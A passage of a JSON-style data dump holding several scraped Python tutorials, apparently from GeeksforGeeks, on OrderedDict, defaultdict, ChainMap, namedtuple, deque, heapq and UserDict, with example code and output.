    "text": "An OrderedDict is a dictionary subclass that remembers the order that keys were first inserted. The only difference between dict() and OrderedDict() is that:OrderedDict preserves the order in which the keys are inserted. A regular dict doesn\u2019t track the insertion order and iterating it gives the values in an arbitrary order. By contrast, the order the items are inserted is remembered by OrderedDict.Python3# A Python program to demonstrate working of OrderedDictfrom collections import OrderedDict\u00a0print(\"This is a Dict:\\n\")d = {}d['a'] = 1d['b'] = 2d['c'] = 3d['d'] = 4\u00a0for key, value in d.items():\u00a0\u00a0\u00a0\u00a0print(key, value)\u00a0print(\"\\nThis is an Ordered Dict:\\n\")od = OrderedDict()od['a'] = 1od['b'] = 2od['c'] = 3od['d'] = 4\u00a0for key, value in od.items():\u00a0\u00a0\u00a0\u00a0print(key, value)Output:\u00a0This is a Dict:\na 1\nc 3\nb 2\nd 4\n\nThis is an Ordered Dict:\na 1\nb 2\nc 3\nd 4Important Points:\u00a01. Key value Change: If the value of a certain key is changed, the position of the key remains unchanged in OrderedDict.Python3# A Python program to demonstrate working of key# value change in OrderedDictfrom collections import OrderedDict\u00a0print(\"Before:\\n\")od = OrderedDict()od['a'] = 1od['b'] = 2od['c'] = 3od['d'] = 4for key, value in od.items():\u00a0\u00a0\u00a0\u00a0print(key, value)\u00a0print(\"\\nAfter:\\n\")od['c'] = 5for key, value in od.items():\u00a0\u00a0\u00a0\u00a0print(key, value)Output:\u00a0Before:\n\na 1\nb 2\nc 3\nd 4\n\nAfter:\n\na 1\nb 2\nc 5\nd 42. Deletion and Re-Inserting: Deleting and re-inserting the same key will push it to the back as OrderedDict, however, maintains the order of insertion.Python3# A Python program to demonstrate working of deletion# re-insertion in OrderedDictfrom collections import OrderedDict\u00a0print(\"Before deleting:\\n\")od = OrderedDict()od['a'] = 1od['b'] = 2od['c'] = 3od['d'] = 4\u00a0for key, value in od.items():\u00a0\u00a0\u00a0\u00a0print(key, value)\u00a0print(\"\\nAfter deleting:\\n\")od.pop('c')for key, value in od.items():\u00a0\u00a0\u00a0\u00a0print(key, value)\u00a0print(\"\\nAfter re-inserting:\\n\")od['c'] = 3for key, value in od.items():\u00a0\u00a0\u00a0\u00a0print(key, value)Output:\u00a0Before deleting:\n\na 1\nb 2\nc 3\nd 4\n\nAfter deleting:\n\na 1\nb 2\nd 4\n\nAfter re-inserting:\n\na 1\nb 2\nd 4\nc 3Other Considerations:\u00a0\u00a0Ordered dict in Python version 2.7 consumes more memory than normal dict. This is due to the underlying Doubly Linked List implementation for keeping the order. In Python 2.7 Ordered Dict is not dict subclass, it\u2019s a specialized container from collections module.Starting from Python 3.7, insertion order of Python dictionaries is guaranteed.Ordered Dict can be used as a stack with the help of popitem function. Try implementing LRU cache with Ordered Dict.This article is contributed by Sri Sanketh Uppalapati. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "7dd1039dc16e9fcf3cfc227c9444f9db",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Dictionary in Python is an unordered collection of data values that are used to store data values like a map. Unlike other Data Types that hold only single value as an element, the Dictionary holds key-value pair. In Dictionary, the key must be unique and immutable. This means that a Python Tuple can be a key whereas a Python List can not. A Dictionary can be created by placing a sequence of elements within curly {} braces, separated by \u2018comma\u2019.\u00a0Example:Python3# Python program to demonstrate# dictionary\u00a0\u00a0\u00a0\u00a0Dict = {1: 'Geeks', 2: 'For', 3: 'Geeks'}\u00a0print(\"Dictionary:\")\u00a0print(Dict)print(Dict[1])\u00a0\u00a0# Uncommenting this print(Dict[4])# will raise a KeyError as the# 4 is not present in the dictionaryOutput:Dictionary:\r\n{1: 'Geeks', 2: 'For', 3: 'Geeks'}\r\nGeeksTraceback (most recent call last):\r\n  File \"/home/1ca83108cc81344dc7137900693ced08.py\", line 11, in \r\n    print(Dict[4])\r\nKeyError: 4Sometimes, when the KeyError is raised, it might become a problem. To overcome this Python introduces another dictionary like container known as Defaultdict which is present inside the collections module.Note: For more information, refer to Python Dictionary.\u00a0DefaultDictDefaultdict is a container like dictionaries present in the module collections. Defaultdict is a sub-class of the dictionary class that returns a dictionary-like object. The functionality of both dictionaries and defaultdict are almost same except for the fact that defaultdict never raises a KeyError. It provides a default value for the key that does not exists.Syntax: defaultdict(default_factory)Parameters:\u00a0\u00a0default_factory: A function returning the default value for the dictionary defined. If this argument is absent then the dictionary raises a KeyError.Example:Python3# Python program to demonstrate# defaultdict\u00a0\u00a0\u00a0\u00a0from collections import defaultdict\u00a0\u00a0\u00a0\u00a0# Function to return a default# values for keys that is not# presentdef def_value():\u00a0\u00a0\u00a0\u00a0return \"Not Present\"\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Defining the dictd = defaultdict(def_value)d[\"a\"] = 1d[\"b\"] = 2\u00a0\u00a0print(d[\"a\"])print(d[\"b\"])print(d[\"c\"])Output:1\r\n2\r\nNot Present Inner Working of defaultdictDefaultdict adds one writable instance variable and one method in addition to the standard dictionary operations. The instance variable is the default_factory parameter and the method provided is __missing__.Default_factory: It is a function returning the default value for the dictionary defined. If this argument is absent then the dictionary raises a KeyError.Example:Python3# Python program to demonstrate# default_factory argument of\u00a0# defaultdict\u00a0\u00a0\u00a0\u00a0from collections import defaultdict\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Defining the dict and passing\u00a0# lambda as default_factory argumentd = defaultdict(lambda: \"Not Present\")d[\"a\"] = 1d[\"b\"] = 2\u00a0\u00a0print(d[\"a\"])print(d[\"b\"])print(d[\"c\"])Output:1\r\n2\r\nNot Present__missing__(): This function is used to provide the default value for the dictionary. This function takes default_factory as an argument and if this argument is None, a KeyError is raised otherwise it provides a default value for the given key. This method is basically called by the __getitem__() method of the dict class when the requested key is not found. __getitem__() raises or return the value returned by the __missing__(). method.Example:Python3# Python program to demonstrate# defaultdict\u00a0\u00a0\u00a0\u00a0from collections import defaultdict\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Defining the dictd = defaultdict(lambda: \"Not Present\")d[\"a\"] = 1d[\"b\"] = 2\u00a0\u00a0# Provides the default value\u00a0# for the keyprint(d.__missing__('a'))print(d.__missing__('d'))Output:Not Present\r\nNot Present Using List as default_factoryWhen the list class is passed as the default_factory argument, then a defaultdict is created with the values that are list.Example:Python3# Python program to demonstrate# defaultdict\u00a0\u00a0\u00a0\u00a0from collections import defaultdict\u00a0\u00a0\u00a0\u00a0# Defining a dictd = defaultdict(list)\u00a0\u00a0for i in range(5):\u00a0\u00a0\u00a0\u00a0d[i].append(i)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"Dictionary with values as list:\")print(d)Output:Dictionary with values as list:\r\ndefaultdict(<class 'list'>, {0: [0], 1: [1], 2: [2], 3: [3], 4: [4]})Using int as default_factoryWhen the int class is passed as the default_factory argument, then a defaultdict is created with default value as zero.Example:Python3# Python program to demonstrate# defaultdict\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0from collections import defaultdict\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Defining the dictd = defaultdict(int)\u00a0\u00a0\u00a0L = [1, 2, 3, 4, 2, 4, 1, 2]\u00a0\u00a0\u00a0# Iterate through the list# for keeping the countfor i in L:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# The default value is 0\u00a0\u00a0\u00a0\u00a0# so there is no need to\u00a0\u00a0\u00a0\u00a0\u00a0# enter the key first\u00a0\u00a0\u00a0\u00a0d[i] += 1\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(d)Output:defaultdict(<class 'int'>, {1: 2, 2: 3, 3: 1, 4: 2})My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "8da9d6c727788a42d8a1748d5da91d4a",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Python contains a container called \u201cChainMap\u201d which encapsulates many dictionaries into one unit. ChainMap is member of module \u201ccollections\u201c.Example:# Python program to demonstrate\u00a0\u00a0# ChainMap\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0from collections import ChainMap\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0d1 = {'a': 1, 'b': 2}\u00a0d2 = {'c': 3, 'd': 4}\u00a0d3 = {'e': 5, 'f': 6}\u00a0\u00a0\u00a0\u00a0\u00a0# Defining the chainmap\u00a0\u00a0c = ChainMap(d1, d2, d3)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(c)Output:ChainMap({'a': 1, 'b': 2}, {'c': 3, 'd': 4}, {'e': 5, 'f': 6})\r\nLet\u2019s see various Operations on ChainMapAccess Operationskeys() :- This function is used to display all the keys of all the dictionaries in ChainMap.values() :- This function is used to display values of all the dictionaries in ChainMap.maps() :- This function is used to display keys with corresponding values of all the dictionaries in ChainMap.# Please select Python 3 for running this code in IDE# Python code to demonstrate ChainMap and# keys(), values() and maps\u00a0\u00a0# importing collections for ChainMap operationsimport collections\u00a0\u00a0# initializing dictionariesdic1 = { 'a' : 1, 'b' : 2 }dic2 = { 'b' : 3, 'c' : 4 }\u00a0\u00a0# initializing ChainMapchain = collections.ChainMap(dic1, dic2)\u00a0\u00a0# printing chainMap using mapsprint (\"All the ChainMap contents are : \")print (chain.maps)\u00a0\u00a0# printing keys using keys()print (\"All keys of ChainMap are : \")print (list(chain.keys()))\u00a0\u00a0# printing keys using keys()print (\"All values of ChainMap are : \")print (list(chain.values()))Output :All the ChainMap contents are : \r\n[{'b': 2, 'a': 1}, {'c': 4, 'b': 3}]\r\nAll keys of ChainMap are : \r\n['a', 'c', 'b']\r\nAll values of ChainMap are : \r\n[1, 4, 2]\r\n\u00a0Note : Notice the key named \u201cb\u201d exists in both dictionaries, but only first dictionary key is taken as key value of \u201cb\u201d. Ordering is done as the dictionaries are passed in function.Manipulating Operationsnew_child() :- This function adds a new dictionary in the beginning of the ChainMap.reversed() :- This function reverses the relative ordering of dictionaries in the ChainMap.# Please select Python 3 for running this code in IDE# Python code to demonstrate ChainMap and# reversed() and new_child()\u00a0\u00a0# importing collections for ChainMap operationsimport collections\u00a0\u00a0# initializing dictionariesdic1 = { 'a' : 1, 'b' : 2 }dic2 = { 'b' : 3, 'c' : 4 }dic3 = { 'f' : 5 }\u00a0\u00a0# initializing ChainMapchain = collections.ChainMap(dic1, dic2)\u00a0\u00a0# printing chainMap using mapprint (\"All the ChainMap contents are : \")print (chain.maps)\u00a0\u00a0# using new_child() to add new dictionarychain1 = chain.new_child(dic3)\u00a0\u00a0# printing chainMap using mapprint (\"Displaying new ChainMap : \")print (chain1.maps)\u00a0\u00a0# displaying value associated with b before reversingprint (\"Value associated with b before reversing is : \",end=\"\")print (chain1['b'])\u00a0\u00a0# reversing the ChainMapchain1.maps = reversed(chain1.maps)\u00a0\u00a0# displaying value associated with b after reversingprint (\"Value associated with b after reversing is : \",end=\"\")print (chain1['b'])Output :All the ChainMap contents are : \r\n[{'b': 2, 'a': 1}, {'b': 3, 'c': 4}]\r\nDisplaying new ChainMap : \r\n[{'f': 5}, {'b': 2, 'a': 1}, {'b': 3, 'c': 4}]\r\nValue associated with b before reversing is : 2\r\nValue associated with b after reversing is : 3\r\n\u00a0This article is contributed by Manjeet Singh. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "ce1608c4e95a72c60dd53e74e75f2686",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Python supports a type of container like dictionaries called \u201cnamedtuple()\u201d present in the module, \u201ccollections\u201c. Like dictionaries, they contain keys that are hashed to a particular value. But on contrary, it supports both access from key-value and iteration, the functionality that dictionaries lack.Example:\u00a0Python3# Python code to demonstrate namedtuple()\u00a0from collections import namedtuple\u00a0# Declaring namedtuple()Student = namedtuple('Student', ['name', 'age', 'DOB'])\u00a0# Adding valuesS = Student('Nandini', '19', '2541997')\u00a0# Access using indexprint(\"The Student age using index is : \", end=\"\")print(S[1])\u00a0# Access using nameprint(\"The Student name using keyname is : \", end=\"\")print(S.name)Output:The Student age using index is : 19\nThe Student name using keyname is : NandiniLet\u2019s see various Operations on namedtuple()\u00a0Access OperationsAccess by index: The attribute values of namedtuple() are ordered and can be accessed using the index number unlike dictionaries which are not accessible by index.Access by keyname: Access by keyname is also allowed as in dictionaries.using getattr(): This is yet another way to access the value by giving namedtuple and key value as its argument.Python3# Python code to demonstrate namedtuple() and# Access by name, index and getattr()\u00a0# importing \"collections\" for namedtuple()import collections\u00a0# Declaring namedtuple()Student = collections.namedtuple('Student', ['name', 'age', 'DOB'])\u00a0# Adding valuesS = Student('Nandini', '19', '2541997')\u00a0# Access using indexprint(\"The Student age using index is : \", end=\"\")print(S[1])\u00a0# Access using nameprint(\"The Student name using keyname is : \", end=\"\")print(S.name)\u00a0# Access using getattr()print(\"The Student DOB using getattr() is : \", end=\"\")print(getattr(S, 'DOB'))Output :\u00a0The Student age using index is : 19\nThe Student name using keyname is : Nandini\nThe Student DOB using getattr() is : 2541997Conversion Operations_make() :- This function is used to return a namedtuple() from the iterable passed as argument._asdict() :- This function returns the OrderedDict() as constructed from the mapped values of namedtuple().using \u201c**\u201d (double star) operator :- This function is used to convert a dictionary into the namedtuple().Python3# Python code to demonstrate namedtuple() and# _make(), _asdict() and \"**\" operator\u00a0# importing \"collections\" for namedtuple()import collections\u00a0# Declaring namedtuple()Student = collections.namedtuple('Student',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0['name', 'age', 'DOB'])\u00a0# Adding valuesS = Student('Nandini', '19', '2541997')\u00a0# initializing iterableli = ['Manjeet', '19', '411997']\u00a0# initializing dictdi = {'name': \"Nikhil\", 'age': 19, 'DOB': '1391997'}\u00a0# using _make() to return namedtuple()print(\"The namedtuple instance using iterable is\u00a0 : \")print(Student._make(li))\u00a0# using _asdict() to return an OrderedDict()print(\"The OrderedDict instance using namedtuple is\u00a0 : \")print(S._asdict())\u00a0# using ** operator to return namedtuple from dictionaryprint(\"The namedtuple instance from dict is\u00a0 : \")print(Student(**di))Output :\u00a0The namedtuple instance using iterable is  : \nStudent(name='Manjeet', age='19', DOB='411997')\nThe OrderedDict instance using namedtuple is  : \nOrderedDict([('name', 'Nandini'), ('age', '19'), ('DOB', '2541997')])\nThe namedtuple instance from dict is  : \nStudent(name='Nikhil', age=19, DOB='1391997')Additional Operation\u00a0_fields: This function is used to return all the keynames of the namespace declared._replace(): _replace() is like str.replace() but targets named fields( does not modify the original values)Python3# Python code to demonstrate namedtuple() and# _fields and _replace()\u00a0# importing \"collections\" for namedtuple()import collections\u00a0# Declaring namedtuple()Student = collections.namedtuple('Student', ['name', 'age', 'DOB'])\u00a0# Adding valuesS = Student('Nandini', '19', '2541997')\u00a0# using _fields to display all the keynames of namedtuple()print(\"All the fields of students are : \")print(S._fields)\u00a0# ._replace returns a new namedtuple, it does not modify the originalprint(\"returns a new namedtuple : \")print(S._replace(name='Manjeet'))# original namedtupleprint(S)Output :\u00a0All the fields of students are : \n('name', 'age', 'DOB')\nThe modified namedtuple is : \nStudent(name='Manjeet', age='19', DOB='2541997') This article is contributed by Manjeet Singh. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "98b7aa3eb22c9946683416cafe28cf76",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Deque (Doubly Ended Queue) in Python is implemented using the module \u201ccollections\u201c. Deque is preferred over a list in the cases where we need quicker append and pop operations from both the ends of the container, as deque provides an O(1) time complexity for append and pop operations as compared to list which provides O(n) time complexity.Example:Python3# Python code to demonstrate deque\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0from collections import deque\u00a0\u00a0\u00a0\u00a0\u00a0# Declaring dequequeue = deque(['name','age','DOB'])\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(queue)Output:\u00a0deque(['name', 'age', 'DOB'])Let\u2019s see various Operations on deque :\u00a0append():- This function is used to insert the value in its argument to the right end of the deque.appendleft():- This function is used to insert the value in its argument to the left end of the deque.pop():- This function is used to delete an argument from the right end of the deque.popleft():- This function is used to delete an argument from the left end of the deque.Python3# Python code to demonstrate working of# append(), appendleft(), pop(), and popleft()\u00a0# importing \"collections\" for deque operationsimport collections\u00a0# initializing dequede = collections.deque([1,2,3])\u00a0# using append() to insert element at right end# inserts 4 at the end of dequede.append(4)\u00a0# printing modified dequeprint (\"The deque after appending at right is : \")print (de)\u00a0# using appendleft() to insert element at left end# inserts 6 at the beginning of dequede.appendleft(6)\u00a0# printing modified dequeprint (\"The deque after appending at left is : \")print (de)\u00a0# using pop() to delete element from right end# deletes 4 from the right end of dequede.pop()\u00a0# printing modified dequeprint (\"The deque after deleting from right is : \")print (de)\u00a0# using popleft() to delete element from left end# deletes 6 from the left end of dequede.popleft()\u00a0# printing modified dequeprint (\"The deque after deleting from left is : \")print (de)Output:\u00a0The deque after appending at right is : \ndeque([1, 2, 3, 4])\nThe deque after appending at left is : \ndeque([6, 1, 2, 3, 4])\nThe deque after deleting from right is : \ndeque([6, 1, 2, 3])\nThe deque after deleting from left is : \ndeque([1, 2, 3])index(ele, beg, end):- This function returns the first index of the value mentioned in arguments, starting searching from beg till end index.insert(i, a) :- This function inserts the value mentioned in arguments(a) at index(i) specified in arguments.remove():- This function removes the first occurrence of value mentioned in arguments.count():- This function counts the number of occurrences of value mentioned in arguments.Python3# Python code to demonstrate working of# insert(), index(), remove(), count()\u00a0# importing \"collections\" for deque operationsimport collections\u00a0# initializing dequede = collections.deque([1, 2, 3, 3, 4, 2, 4])\u00a0# using index() to print the first occurrence of 4print (\"The number 4 first occurs at a position : \")print (de.index(4,2,5))\u00a0# using insert() to insert the value 3 at 5th positionde.insert(4,3)\u00a0# printing modified dequeprint (\"The deque after inserting 3 at 5th position is : \")print (de)\u00a0# using count() to count the occurrences of 3print (\"The count of 3 in deque is : \")print (de.count(3))\u00a0# using remove() to remove the first occurrence of 3de.remove(3)\u00a0# printing modified dequeprint (\"The deque after deleting first occurrence of 3 is : \")print (de)Output:\u00a0\u00a0The number 4 first occurs at a position : \n4\nThe deque after inserting 3 at 5th position is : \ndeque([1, 2, 3, 3, 3, 4, 2, 4])\nThe count of 3 in deque is : \n3\nThe deque after deleting first occurrence of 3 is : \ndeque([1, 2, 3, 3, 4, 2, 4])extend(iterable):- This function is used to add multiple values at the right end of the deque. The argument passed is iterable.extendleft(iterable):- This function is used to add multiple values at the left end of the deque. The argument passed is iterable. Order is reversed as a result of left appends.reverse():- This function is used to reverse the order of deque elements.rotate():- This function rotates the deque by the number specified in arguments. If the number specified is negative, rotation occurs to the left. Else rotation is to right.Python3# Python code to demonstrate working of# extend(), extendleft(), rotate(), reverse()\u00a0# importing \"collections\" for deque operationsimport collections\u00a0# initializing dequede = collections.deque([1, 2, 3,])\u00a0# using extend() to add numbers to right end# adds 4,5,6 to right endde.extend([4,5,6])\u00a0# printing modified dequeprint (\"The deque after extending deque at end is : \")print (de)\u00a0# using extendleft() to add numbers to left end# adds 7,8,9 to left endde.extendleft([7,8,9])\u00a0# printing modified dequeprint (\"The deque after extending deque at beginning is : \")print (de)\u00a0# using rotate() to rotate the deque# rotates by 3 to leftde.rotate(-3)\u00a0# printing modified dequeprint (\"The deque after rotating deque is : \")print (de)\u00a0# using reverse() to reverse the dequede.reverse()\u00a0# printing modified dequeprint (\"The deque after reversing deque is : \")print (de)Output :\u00a0The deque after extending deque at end is : \ndeque([1, 2, 3, 4, 5, 6])\nThe deque after extending deque at beginning is : \ndeque([9, 8, 7, 1, 2, 3, 4, 5, 6])\nThe deque after rotating deque is : \ndeque([1, 2, 3, 4, 5, 6, 9, 8, 7])\nThe deque after reversing deque is : \ndeque([7, 8, 9, 6, 5, 4, 3, 2, 1]) \u00a0This article is contributed by Manjeet Singh. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "b21b1ef11be005e5a0d038afd9c2c77c",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Heap data structure is mainly used to represent a priority queue. In Python, it is available using \u201cheapq\u201d module. The property of this data structure in Python is that each time the smallest of heap element is popped(min heap). Whenever elements are pushed or popped, heap structure in maintained. The heap[0] element also returns the smallest element each time.Let\u2019s see various Operations on heap :heapify(iterable) :- This function is used to convert the iterable into a heap data structure. i.e. in heap order.heappush(heap, ele) :- This function is used to insert the element mentioned in its arguments into heap. The order is adjusted, so as heap structure is maintained.heappop(heap) :- This function is used to remove and return the smallest element from heap. The order is adjusted, so as heap structure is maintained.# Python code to demonstrate working of\u00a0# heapify(), heappush() and heappop()\u00a0\u00a0# importing \"heapq\" to implement heap queueimport heapq\u00a0\u00a0# initializing listli = [5, 7, 9, 1, 3]\u00a0\u00a0# using heapify to convert list into heapheapq.heapify(li)\u00a0\u00a0# printing created heapprint (\"The created heap is : \",end=\"\")print (list(li))\u00a0\u00a0# using heappush() to push elements into heap# pushes 4heapq.heappush(li,4)\u00a0\u00a0# printing modified heapprint (\"The modified heap after push is : \",end=\"\")print (list(li))\u00a0\u00a0# using heappop() to pop smallest elementprint (\"The popped and smallest element is : \",end=\"\")print (heapq.heappop(li))Output :\r\nThe created heap is : [1, 3, 9, 7, 5]\r\nThe modified heap after push is : [1, 3, 4, 7, 5, 9]\r\nThe popped and smallest element is : 1\r\nheappushpop(heap, ele) :- This function combines the functioning of both push and pop operations in one statement, increasing efficiency. Heap order is maintained after this operation.heapreplace(heap, ele) :- This function also inserts and pops element in one statement, but it is different from above function. In this, element is first popped, then the element is pushed.i.e, the value larger than the pushed value can be returned. heapreplace() returns the smallest value originally in heap regardless of the pushed element as opposed to heappushpop().# Python code to demonstrate working of\u00a0# heappushpop() and heapreplce()\u00a0\u00a0# importing \"heapq\" to implement heap queueimport heapq\u00a0\u00a0# initializing list 1li1 = [5, 7, 9, 4, 3]\u00a0\u00a0# initializing list 2li2 = [5, 7, 9, 4, 3]\u00a0\u00a0# using heapify() to convert list into heapheapq.heapify(li1)heapq.heapify(li2)\u00a0\u00a0# using heappushpop() to push and pop items simultaneously# pops 2print (\"The popped item using heappushpop() is : \",end=\"\")print (heapq.heappushpop(li1, 2))\u00a0\u00a0# using heapreplace() to push and pop items simultaneously# pops 3print (\"The popped item using heapreplace() is : \",end=\"\")print (heapq.heapreplace(li2, 2))Output :\r\nThe popped item using heappushpop() is : 2\r\nThe popped item using heapreplace() is : 3\r\nnlargest(k, iterable, key = fun) :- This function is used to return the k largest elements from the iterable specified and satisfying the key if mentioned.nsmallest(k, iterable, key = fun) :- This function is used to return the k smallest elements from the iterable specified and satisfying the key if mentioned.# Python code to demonstrate working of\u00a0# nlargest() and nsmallest()\u00a0\u00a0# importing \"heapq\" to implement heap queueimport heapq\u00a0\u00a0# initializing list\u00a0li1 = [6, 7, 9, 4, 3, 5, 8, 10, 1]\u00a0\u00a0# using heapify() to convert list into heapheapq.heapify(li1)\u00a0\u00a0# using nlargest to print 3 largest numbers# prints 10, 9 and 8print(\"The 3 largest numbers in list are : \",end=\"\")print(heapq.nlargest(3, li1))\u00a0\u00a0# using nsmallest to print 3 smallest numbers# prints 1, 3 and 4print(\"The 3 smallest numbers in list are : \",end=\"\")print(heapq.nsmallest(3, li1))Output :\r\nThe 3 largest numbers in list are : [10, 9, 8]\r\nThe 3 smallest numbers in list are : [1, 3, 4]\r\nThis article is contributed by Manjeet Singh. If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "c2eb38543c06c92c26e33c6dc82f4b2d",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "An unordered collection of data values that are used to store data values like a map is known as Dictionary in Python. Unlike other Data Types that hold only a single value as an element, Dictionary holds key:value pair. Key-value is provided in the dictionary to make it more optimized.Note: For more information, refer to Python DictionaryCollections.UserDictPython supports a dictionary like a container called UserDict present in the collections module. This class acts as a wrapper class around the dictionary objects. This class is useful when one wants to create a dictionary of their own with some modified functionality or with some new functionality. It can be considered as a way of adding new behaviors to the dictionary. This class takes a dictionary instance as an argument and simulates a dictionary that is kept in a regular dictionary. The dictionary is accessible by the data attribute of this class.Syntax:\u00a0collections.UserDict([initialdata])Example 1:Python3# Python program to demonstrate# userdict\u00a0\u00a0from collections import UserDict\u00a0\u00a0d = {'a':1,\u00a0\u00a0\u00a0\u00a0'b': 2,\u00a0\u00a0\u00a0\u00a0'c': 3}\u00a0# Creating an UserDictuserD = UserDict(d)print(userD.data)\u00a0\u00a0# Creating an empty UserDictuserD = UserDict()print(userD.data)Output:{'a': 1, 'b': 2, 'c': 3}\n{}Example 2: Let\u2019s create a class inheriting from UserDict to implement a customized dictionary.Python3# Python program to demonstrate# userdict\u00a0\u00a0\u00a0from collections import UserDict\u00a0\u00a0\u00a0# Creating a Dictionary where# deletion is not allowedclass MyDict(UserDict):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Function to stop deletion\u00a0\u00a0\u00a0\u00a0# from dictionary\u00a0\u00a0\u00a0\u00a0def __del__(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0raise RuntimeError(\"Deletion not allowed\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Function to stop pop from\u00a0\u00a0\u00a0\u00a0# dictionary\u00a0\u00a0\u00a0\u00a0def pop(self, s = None):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0raise RuntimeError(\"Deletion not allowed\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Function to stop popitem\u00a0\u00a0\u00a0\u00a0# from Dictionary\u00a0\u00a0\u00a0\u00a0def popitem(self, s = None):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0raise RuntimeError(\"Deletion not allowed\")\u00a0\u00a0\u00a0\u00a0\u00a0# Driver's coded = MyDict({'a':1,\u00a0\u00a0\u00a0\u00a0'b': 2,\u00a0\u00a0\u00a0\u00a0'c': 3})\u00a0print(\"Original Dictionary\")print(d)\u00a0d.pop(1)Output:Original Dictionary\n{'a': 1, 'c': 3, 'b': 2}Traceback (most recent call last):\n  File \"/home/3ce2f334f5d25a3e24d10d567c705ce6.py\", line 35, in \n    d.pop(1)\n  File \"/home/3ce2f334f5d25a3e24d10d567c705ce6.py\", line 20, in pop\n    raise RuntimeError(\"Deletion not allowed\")\nRuntimeError: Deletion not allowed\nException ignored in: \nTraceback (most recent call last):\n  File \"/home/3ce2f334f5d25a3e24d10d567c705ce6.py\", line 15, in __del__\nRuntimeError: Deletion not allowed\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
